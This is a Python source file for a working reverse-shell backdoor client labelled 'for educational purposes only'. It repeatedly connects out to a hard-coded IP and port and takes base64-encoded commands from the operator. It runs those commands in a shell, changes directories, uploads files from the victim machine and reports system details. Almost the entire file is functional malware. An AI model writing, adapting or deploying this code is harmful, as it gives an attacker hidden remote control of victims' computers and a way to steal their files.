#!/usr/bin/env python3
# -*- coding: utf-8 -*-


# ----------------------------------------------------
# This program is for educational purposes only!
# I am not responsible for anything you do with it.
# ----------------------------------------------------


# Imports
import base64
import os
import platform
import socket
import subprocess
import sys
import time

# Variables
IP = '192.168.0.106'
PORT = 33434
CHUNKS = 2048
BANNER = b"""
  ____  _                 _        ____        _   _                   ____             _       _                  
 / ___|(_)_ __ ___  _ __ | | ___  |  _ \ _   _| |_| |__   ___  _ __   | __ )  __ _  ___| | ____| | ___   ___  _ __ 
 \___ \| | '_ ` _ \| '_ \| |/ _ \ | |_) | | | | __| '_ \ / _ \| '_ \  |  _ \ / _` |/ __| |/ / _` |/ _ \ / _ \| '__|
  ___) | | | | | | | |_) | |  __/ |  __/| |_| | |_| | | | (_) | | | | | |_) | (_| | (__|   < (_| | (_) | (_) | |   
 |____/|_|_| |_| |_| .__/|_|\___| |_|    \__, |\__|_| |_|\___/|_| |_| |____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|   
                   |_|                   |___/                                                                     

This program is for educational purposes only!
I am not responsible for anything you do with it.                          
"""

def _base64_encode(message):
    return base64.b64encode(message)


def _base64_decode(message):
    return base64.b64decode(message)


def simple_python_backdoor_client_connect():

    # Infinite loop until socket can connect
    while True:
        try:
            _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            _socket.connect((IP, PORT))
            return _socket
        except socket.error:
            # Wait 5 seconds to try again.
            time.sleep(5)


def run_command(command):

    command_output = b'\n'

    if len(command) > 0:
        object_command = subprocess.Popen(command,
                                          shell=True,
                                          stdout=subprocess.PIPE,
                                          stderr=subprocess.PIPE,
                                          stdin=subprocess.PIPE)
        command_output += object_command.stdout.read() + object_command.stderr.read()
    else:
        command_output += b'Error!'

    return command_output


def uname():

    """Este comando exibe informações sobre o sistema."""

    return f'System: {platform.system()}\nNode: {platform.node()}\nRelease: {platform.release()}\n' \
           f'Version: {platform.version()}\nMachine: {platform.machine()}\nProcessor: {platform.processor()}\n' \
           f'Python Version: {platform.python_version()}\nPython Compiler: {platform.python_compiler()}\n' \
           f'Python Build: {platform.python_build()}'


def change_directory(sock, directory):

    # Change directory.
    os.chdir(directory)
    sock.send(f'Changed directory to {os.getcwd()}'.encode())


def download_files(sock, file):

    if not os.path.isfile(file):
        sock.send(b'Target file not found!')
    else:
        sock.send(b'Sending...')
        with open(file, 'rb') as _file:
            file_data = _file.read(CHUNKS)
            while file_data:
                sock.send(file_data)
                file_data = _file.read(1024)
            time.sleep(2)
            sock.send(b'Send file done!')

    print('Finished sending data')


def main():
    _socket = simple_python_backdoor_client_connect()
    _socket.send(BANNER)

    # Infinite loop until socket can connect.
    while True:
        data = _base64_decode(_socket.recv(CHUNKS))
        str_data = data.decode()

        # Terminate the connection.
        if 'exit' in str_data:
            _socket.close()
            sys.exit(0)
        # Change directory.
        elif 'cd' in str_data:
            change_directory(_socket, str_data.split(' ')[-1])
        # Download files.
        elif 'copy' in str_data:
            download_files(_socket, str_data.split(' ')[-1])
        # Get system info.
        elif 'uname' in str_data:
            _socket.send(uname().encode())
        # Run any other command.
        else:
            output = run_command(str_data)
            _socket.send(output)


if __name__ == '__main__':
    main()
